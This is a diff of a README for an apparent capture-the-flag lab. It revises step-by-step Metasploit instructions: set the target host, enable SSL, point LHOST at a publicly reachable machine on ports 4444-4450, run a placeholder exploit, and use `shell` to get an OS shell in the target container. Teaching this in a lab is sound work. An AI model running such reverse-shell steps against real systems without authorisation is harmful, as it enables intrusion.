@@ -56,7 +56,6 @@ If you have Docker installed you can simply run the metasploit container image. 
 ##### Running the Metasploit Image
 
 
-
 Pull metasploit docker image from DockerHub
 
 `docker pull metasploitframework/metasploit-framework`
@@ -73,7 +72,8 @@ Select the exploit you are going to use from the search results:
 
 `use <path/to/the/exploit>`
 
-Set the host and port for the attacker's and victim's machine
+Set the host IP and port for the target machine
+IMPORTANT, if your host is behind a load balancer you should choose 1 of the load balancer IPs for the attack. You can determine the ips with `nslookup <HOST_NAME>`
 
 `set RHOSTS <host>`
 
@@ -82,6 +82,8 @@ Set the host and port for the attacker's and victim's machine
 If your target is running on an encrypted port then you need to enable SSL
 
 `set SSL true`
+
+Set the host IP and port for the machine running Metasploit. This machine should be publcly available and accessible over ports 4444-4450
 
 `set LHOST <remote IP of Metasploit machine>`
 
@@ -96,7 +98,11 @@ This may fail in some cases, if it fails once reset the LHOST and run again
 `set LHOST <remote IP of Metasploit machine>`
 `run`
 
-You should be able to get shell at this point and run commands in the container. Can you get the flag? Good luck!
+You should be able to get shell at this point and run commands in the container. 
+
+To drop into a OS shell use the `shell` command.
+
+Can you get the flag? Good luck!
 
 If you want to learn more about Metasploit, please check out this free course from Offensive Security: [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
 
